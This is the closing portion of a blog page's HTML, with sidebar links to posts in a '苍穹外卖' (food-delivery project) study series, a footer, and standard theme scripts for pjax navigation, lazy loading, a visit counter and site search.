src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101854084.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="苍穹外卖-DAY12"/></a><div class="content"><a class="title" href="/2026/02/10/skyDay12/" title="苍穹外卖-DAY12">苍穹外卖-DAY12</a><time datetime="2026-02-10T10:10:40.000Z" title="发表于 2026-02-10 18:10:40">2026-02-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/10/skyDay11/" title="苍穹外卖-DAY11"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191215.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="苍穹外卖-DAY11"/></a><div class="content"><a class="title" href="/2026/02/10/skyDay11/" title="苍穹外卖-DAY11">苍穹外卖-DAY11</a><time datetime="2026-02-10T10:01:00.000Z" title="发表于 2026-02-10 18:01:00">2026-02-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/10/skyDay10/" title="苍穹外卖-DAY10"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan9.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="苍穹外卖-DAY10"/></a><div class="content"><a class="title" href="/2026/02/10/skyDay10/" title="苍穹外卖-DAY10">苍穹外卖-DAY10</a><time datetime="2026-02-10T10:00:50.000Z" title="发表于 2026-02-10 18:00:50">2026-02-10</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-flex"></div><div class="footer-other"><div class="footer-copyright"><span class="copyright">© 2025 chuanchuan</span><br/><span class="footer-separator">|</span><span class="footer-slogan">我希望海浪喧嚣，
+让我听到我孤独的自由才好</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3-b2"></script><script src="/js/main.js?v=5.5.3-b2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索一下.." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.3-b2"></script></div></div></body></html>
